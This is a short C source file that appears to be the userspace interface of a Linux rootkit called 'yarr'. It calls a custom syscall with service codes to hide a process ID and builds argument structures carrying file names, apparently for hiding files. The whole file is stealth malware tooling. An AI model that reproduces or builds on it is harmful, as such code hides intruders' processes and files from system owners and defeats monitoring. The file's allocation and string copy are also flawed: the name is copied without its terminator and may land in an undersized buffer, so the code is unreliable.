#define _GNU_SOURCE
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#include "yarrlib.h"

long yarrcall(YarrcallArgs_t *args, size_t args_size) {
    return syscall(YARR_VECTOR, args, args_size);
}

long hide_process(pid_t pid) {
    YarrcallArgs_t yarr_args;

    yarr_args.svc = HIDE_PID;
    yarr_args.hidepid_args.pid = pid;
    return yarrcall(&yarr_args, sizeof(yarr_args));
}

YarrcallArgs_t * YarrcallArgs_create(const char *fname) {
    YarrcallArgs_t *ptr;
    size_t fname_len;

    if (fname == NULL) {
        return NULL;
    }

    fname_len = strlen(fname);
    // TODO: If fname is short enough we might end up allocating a
    // YarrcallArgs_t that is actually smaller than its "official"
    // sizeof(YarrcallArgs_t) size.
    ptr = malloc(sizeof(HideFileArgs_t) + fname_len + 1);
    if (ptr != NULL) {
        ptr->hidefile_args.size = fname_len + 1;
        strncpy(ptr->hidefile_args.fname, fname, fname_len);
    }

    return ptr;
}

void YarrcallArgs_free(YarrcallArgs_t *ptr) {
    free(ptr);
}

